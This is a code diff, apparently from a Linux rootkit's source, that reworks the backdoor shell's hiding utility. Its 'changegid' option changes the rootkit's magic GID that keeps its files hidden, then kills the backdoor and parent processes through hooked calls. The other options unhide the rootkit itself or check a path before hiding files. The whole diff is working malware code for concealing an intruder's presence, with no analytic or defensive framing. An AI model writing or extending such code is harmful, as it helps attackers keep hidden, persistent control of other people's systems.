@@ -35,16 +35,18 @@ void do_hidingutil(char *const argv[]){
 
 #ifdef READ_GID_FROM_FILE
     if(!strcmp("changegid", option)){
-        printf("you are about to change the rootkit's GID.\n");
-        printf("the rootkit will hide its own files, but not files you have created.\n");
-        printf("once the magic GID has been changed, your backdoor process will be killed\n");
-        printf("and you will have to log back in.\n");
-        printf("press enter if you really wanna do this.\n");
-        getchar();
-        printf("current magic GID: %d\n", readgid());
         gid_t newgid;
-        changerkgid(&newgid);
+
+        printf("current magic GID: %d\n", readgid());
+        printf("you are about to change the rootkit's GID.\n");
+        printf("this backdoor process will be killed & you'll have to reconnect.\n");
+        printf("press enter if you really wanna do this.\n");
+        
+        getchar();
+        
+        newgid = changerkgid();
         printf("new magic GID: %d\n", newgid);
+
         hook(CKILL);
         call(CKILL, getppid(), SIGKILL);
         call(CKILL, getpid(), SIGKILL);
@@ -52,17 +54,17 @@ void do_hidingutil(char *const argv[]){
     }
 #endif
 
-
     if(!strcmp("unhideself", option))
         do_self();
 
+    // option was neither changegid or unhideself.
+    // file op desired.
     path = argv[2];
     if(path == NULL)
         option_err();
 
     hook(CACCESS);
     path_status = (long)call(CACCESS, path, F_OK);
-
     if(path_status != 0){
         printf("%s\n", ERR_ACSS_PATH);
         exit(-1);
